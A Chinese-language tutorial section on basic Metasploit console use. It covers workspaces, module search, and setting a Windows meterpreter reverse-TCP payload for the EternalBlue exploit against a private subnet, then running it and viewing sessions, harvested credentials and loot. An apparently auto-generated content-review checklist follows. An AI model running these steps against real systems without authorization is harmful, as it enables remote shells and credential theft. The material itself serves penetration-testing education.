# MSF基础操作

### 2.1 工作区管理

工作区（Workspace）用于隔离不同测试项目的数据：

```
msf6 > workspace              # 查看当前工作区
msf6 > workspace -a ProjectA  # 创建并切换到新工作区
msf6 > workspace ProjectA     # 切换到指定工作区
msf6 > workspace -d ProjectA  # 删除工作区
msf6 > workspace -r ProjectA ProjectB  # 重命名
```

### 2.2 模块搜索与选择

```
msf6 > search ms17_010              # 按名称搜索
msf6 > search type:exploit          # 按类型搜索
msf6 > search name:eternalblue      # 按名称搜索
msf6 > search platform:windows     # 按平台搜索
msf6 > search rank:excellent       # 按可靠性等级搜索
msf6 > search cve:2021-44228       # 按 CVE 编号搜索

msf6 > use exploit/windows/smb/ms17_010_eternalblue  # 选择模块
msf6 (exploit) > info              # 查看模块详情
msf6 (exploit) > show options      # 查看可用参数
msf6 (exploit) > show targets      # 查看可用目标
msf6 (exploit) > show payloads     # 查看兼容 Payload
msf6 (exploit) > show advanced     # 查看高级选项
```

### 2.3 参数配置

```
msf6 > set RHOSTS 192.168.1.100       # 设置目标主机
msf6 > set RHOSTS 192.168.1.0/24      # 设置目标网段（批量）
msf6 > set RPORT 445                   # 设置目标端口
msf6 > set LHOST 192.168.1.5           # 设置本地监听地址
msf6 > set LPORT 4444                  # 设置本地监听端口
msf6 > set THREADS 10                  # 设置并发线程数
msf6 > set TARGET 0                    # 选择目标编号
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp  # 设置 Payload
msf6 > setg LHOST 192.168.1.5         # 设置全局参数（所有模块生效）
msf6 > setg LPORT 4444
```

### 2.4 执行与结果查看

```
msf6 > exploit            # 执行利用（也可简写为 run）
msf6 > exploit -j         # 后台执行（用于批量扫描）
msf6 > sessions            # 查看活跃会话
msf6 > sessions -l        # 列出所有会话
msf6 > sessions -i 1      # 切换到会话 1
msf6 > sessions -k         # 关闭所有会话

msf6 > hosts               # 查看发现的主机
msf6 > services            # 查看发现的服务
msf6 > vulns               # 查看发现的漏洞
msf6 > creds               # 查看获取的凭据
msf6 > loot                # 查看获取的文件证据
```

---

---

## 📋 内容审核与补充建议

> 针对「MSF基础操作」部分的内容审核结果：

### 🔧 工具推荐
- ⚠️ 缺少tools相关内容

### 📚 知识点补充
- ⚠️ 缺少knowledge相关内容

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
